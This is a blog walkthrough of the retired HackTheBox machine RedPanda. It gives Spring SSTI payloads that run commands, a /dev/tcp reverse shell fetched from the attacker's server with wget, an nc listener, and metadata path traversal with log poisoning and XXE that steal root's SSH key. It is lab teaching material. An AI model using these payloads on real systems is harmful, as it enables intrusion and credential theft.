---
layout: post
date: 2023-05-04
title: "RedPanda Walkthrough"
categories: [hackthebox]
tags: [hackthebox, linux, ssti, xxe, web, injection, log poisoning]
---

This is a walkthrough on how to complete the RedPanda box on Hackthebox.com. This box has been retired. The box is rated as **easy** difficulty. You can attempt the machine [here](https://app.hackthebox.com/machines/481) as well as view their write up on the box. 

Required Skills include: Web enumeration, Linux fundamentals, burp fundamental skills and how to read and understand basic java.



I first ran an nmap scan to scan the server stumbling across port 22 8080. I did not have credentials for SSH so I went to the website finding this page.

```nmap -p- -Pn -n -v <ip>```

![](/assets/images/RedPanda/nmapscan.jpg)

Below is the website when I went to the page. You can see it has a search bar.

![](/assets/images/RedPanda/redpandahomepage.jpg)


I then entered a random search term to get the website into burp suite. I then hit space as well and found another interesting webpage. **Greg the panda** which has an author's link. I click on the author's link to see what is there.

![](/assets/images/RedPanda/smoochthepanda.jpg)


You will see when you click on the author's link it comes up with **/img/pandas** and also an **export table** which may come useful later. You may also view the statistics of both authors. 

![](/assets/images/RedPanda/exportlink.jpg)


Below is what the export file looked like.

![](/assets/images/RedPanda/exportfile.jpg)

You may also observe that in source code of the webpage it shows in one of the *title* tags that it running ```Red Panda Search | Made with Spring Boot```

![](/assets/images/RedPanda/basehtml.jpg)


I was unsure on what to do here so I started digging through hacktricks webpage for a web type of vulnerability labeled as SSTI. I  know that the page is running spring boot so I attempted ```${7*7}``` where it stated that I was inputting a banned character. I then replaced the $ with a # sign and it showed me this repsonse. 

![](/assets/images/RedPanda/7x7.jpg)

I then began to dig further through [hacktricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) section which came up with a test example for spring boot. 

``` *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())} ```

this did work. **note that the # was replaced with a *.** From the above command you get the user ID, username and the groups that he has. Now you have a functional RCE and need to exploit that to gain a shell. 

![](/assets/images/RedPanda/initialSSTI.jpg)

You can attempt to run the reverse connection in the [shell](https://revshells.com). However that does not work. You will need to create a file and get the website to download that file. The best way to do this is by running this command. 

```echo "sh -i >& /dev/tcp/<LOCALIP>/<PORT> 0>&1" >> shell.sh```

*ensure you are running a simple webserver before following the next steps* 


``` python3 -m http.server```


``` *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(' wget http://<ip:port>/shell.sh "').getInputStream())} ``` 

```*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('chmod +x shell.sh').getInputStream())} ```

You will need to setup a listener before running the next command. ``` nc -lvnp <port>```

``` *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('/bin/bash ./shell.sh').getInputStream())} ```


now you have a user shell and are able to access the user flag inside the ~/user.txt file

![](/assets/images/RedPanda/firstshell.jpg)


You will then need to enumerate the file system. First thing I tried was sudo -l with no luck because I do not have a password. I then checked the cronjobs and suid bits with no luck. After further enumeration, I found this file ```/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java``` which contained credentials for user: **woodenk**

Inside the file you will see this information. 

![](/assets/images/RedPanda/sqlinfo.jpg)

You can log in via SSH now through woodenk, or you can add your own .ssh/authorized_keys to gain access once you have a shell. You also gain access to the mysql database.

Now that we have access to SSH and the user account with a good shell. We will need to look to escalate our account privileges to the root account. 

We will use pspy64 to observe all commands that will be ran on the victim's machine. 

```wget http://<LOCALIP:PORT>/pspy64```
```chmod +x ./pspy64```
```./pspy64 ```

We see that there is a reoccuring job being ran as the root user semi frequently. 

We find the source code of the application here: /opt/credit-
score/LogParser/final/src/main/java/com/logparser/App.java


* this next section is taken from HTB's writeup as it is very detailed

![](/assets/images/RedPanda/app_javasource.jpg)

In the above code snippet containing the main() function, we see that the log file /opt/panda_search/redpanda.log is being read and a while loop iterates through each line of this log
file. Its contents look like the following.

``` cat /opt/panda_search/redpanda.log```

![](/assets/images/RedPanda/cat_pandlog.jpg)

![](/assets/images/RedPanda/app_source2.jpg)

![](/assets/images/RedPanda/app_source3.jpg)

![](/assets/images/RedPanda/app_source4.jpg)


Now our next steps are to look into the vulnerability. We see that the program is parsing XML so we will look into XXE (XML External Entity Injection)

This code is vulnerable due to the program not sanitizing the inputs. 

```String xmlPath = "/credits/" + artist + "_creds.xml";``` 

We also know that the arist variable is obtained from the Artist field in the metadata of the image file. 

We can input anything into the Artist metadata and make it point to our malicious XML file.

![](/assets/images/RedPanda/filedescriptor.jpg)

![](/assets/images/RedPanda/filedescriptor2.jpg)

We now know that log poisoning is a vulnerability. We will now craft a specially formatted xml file which you can obtain from [hacktricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity). Read throughly and you will be able to craft this XML file.

![](/assets/images/RedPanda/exploitedxml.jpg)

Get the file to the remote machine in whatever fashion  you see fit. (scp, python, curl etc.) You will now need to change the ending of the file name to match due to how the source code reads this information. ex: file_creds.xml

the exiftool will now come into play as we need to modify where the file is being pulled from. 


```exiftool -Artist="../tmp/hax" smooch.jpg``` 

Now this file needs to be placed back onto the remote(vitcim's) host. 

```wget <YOUR_LOCAL_IP>:8000/smooch.jpg```

Now we will need an entry in the log itself. This can be done by running this command.

```curl -A "evil||/../../../../../../../../../../tmp/smooch.jpg" http://<remoteip:port>/```

After waiting for a bit, you should be able to read the /tmp/hax_creds.xml file to obtain the SSH key of the root user.

copy the key to your host, ensure it has 600 permissions and login via SSH. 

```ssh -i <key> root@<ip>```

Make sure you get your root flag. 

cd /root/root.txt

 


My key takeaways are that source code is the key to a lot. It can tell you exactly how a program operates. Whether it is just printing a line of code to opening another browser or parsing through XML data as seen above. It is noteworthy that even code outside of the main app can be useful as you saw due to us being able to gain credentials thus gaining SSH access. To secure a vulnerability like this, you will need to sanitize the inputs of users so they are not able to run code on the machin preventing the RCE from occuring in the first palace.













